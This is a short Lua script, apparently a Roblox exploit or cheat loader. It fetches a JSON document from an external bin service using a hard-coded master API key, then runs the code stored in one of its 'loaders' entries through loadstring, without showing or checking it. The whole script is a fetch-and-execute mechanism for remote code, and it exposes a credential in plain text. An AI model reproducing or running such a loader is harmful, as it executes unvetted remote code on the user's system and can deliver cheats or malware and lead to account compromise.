
local req = game:HttpGet("https://pocket-json-postbox.lovable.app/api/bin/1f6c7140", true, {["X-Master-Key"] = "04310570f2341372b2a62521be2f39c0548cc7c39b5e4c14"});
local success, data = pcall(function() return game:GetService("HttpService"):JSONDecode(req) end);
if success and data and data.loaders and data.loaders["sct_evkpte"] then
    loadstring(data.loaders["sct_evkpte"].code)()
end